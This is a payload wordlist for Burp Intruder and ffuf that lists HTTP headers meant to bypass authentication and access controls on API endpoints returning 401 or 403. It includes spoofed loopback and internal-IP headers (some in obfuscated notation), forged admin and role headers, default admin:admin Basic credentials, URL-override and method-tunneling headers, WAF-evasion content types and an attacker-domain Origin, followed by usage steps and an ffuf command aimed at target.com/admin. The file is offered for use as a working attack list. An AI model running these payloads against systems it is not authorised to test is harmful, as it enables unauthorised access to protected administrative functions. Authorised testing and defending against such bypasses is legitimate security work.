# Authentication Bypass Headers — Burp Intruder / ffuf
# OWASP API Security: API2 — Broken Authentication
# Use: Add these headers to requests that return 401/403

# ============================================================
# IP-BASED BYPASS (Trusted Proxy / Internal Network)
# ============================================================

X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 172.16.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 0.0.0.0
X-Forwarded-For: ::1
X-Forwarded-For: 0177.0.0.1
X-Forwarded-For: 2130706433
X-Forwarded-For: 0x7f000001

X-Real-IP: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Real-Ip: 127.0.0.1

X-Original-URL: /admin
X-Rewrite-URL: /admin

X-Originating-IP: 127.0.0.1
X-Originating-IP: [::1]

X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1

X-Custom-IP-Authorization: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1

True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1

# Chained proxy bypass
X-Forwarded-For: 127.0.0.1, 127.0.0.2

# ============================================================
# ADMIN / ROLE ESCALATION HEADERS
# ============================================================

X-Admin: true
X-Is-Admin: 1
X-Role: admin
X-User-Role: admin
X-Privileged: true
X-Internal: true
X-Debug: true
X-Debug-Mode: 1

# Gateway / service mesh headers
X-Gateway-Auth: bypass
X-Api-Gateway: internal
X-Service-Name: admin-service
X-Internal-Request: true
X-Trusted-Service: true

# ============================================================
# AUTHENTICATION HEADER MANIPULATION
# ============================================================

# Empty / null authentication
Authorization: Bearer
Authorization: Bearer null
Authorization: Bearer undefined
Authorization: Bearer ""
Authorization: Bearer none
Authorization: Bearer INVALID
Authorization:
Authorization: Basic YWRtaW46YWRtaW4=
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Authorization: Basic dGVzdDp0ZXN0

# Token type confusion
Authorization: Token <token_here>
Authorization: JWT <token_here>
Authorization: Bearer <token_here>
Authorization: Basic <token_here>
Authorization: OAuth <token_here>

# API key header variants
X-API-Key: test
X-Api-Key: admin
X-API-KEY: null
Api-Key: test
apikey: test
X-Access-Token: test

# ============================================================
# PATH / URL OVERRIDE HEADERS
# ============================================================

X-Original-URL: /
X-Original-URL: /admin/dashboard
X-Rewrite-URL: /
X-Rewrite-URL: /admin/dashboard

# Verb tunneling (turn GET into POST/PUT/DELETE)
X-HTTP-Method: PUT
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
X-HTTP-Method-Override: DELETE
X-HTTP-Method-Override: PATCH

# ============================================================
# CONTENT-TYPE BYPASS
# ============================================================

# Switch content type to bypass WAF / input validation
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/plain
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: multipart/form-data

# ============================================================
# CACHE / PROXY BYPASS
# ============================================================

Cache-Control: no-cache
Cache-Control: no-store
Pragma: no-cache
X-No-Cache: 1
X-Cache-Bypass: 1

# Proxy headers
X-Forwarded-Proto: https
X-Forwarded-Scheme: https
X-Forwarded-Port: 443
X-URL-Scheme: https

# ============================================================
# CORS / ORIGIN HEADERS
# ============================================================

Origin: null
Origin: https://target.com
Origin: https://target.com.attacker.com
Referer: https://target.com/admin

# ============================================================
# USAGE: BURP INTRUDER
# ============================================================

# 1. Send 401/403 request to Intruder
# 2. Add header position after existing headers
# 3. Load this file as payload list
# 4. Grep for 200/302 responses or different content length
#
# ffuf: ffuf -u https://target.com/admin -w auth_bypass_headers.txt -H "FUZZ" -mc 200,301,302
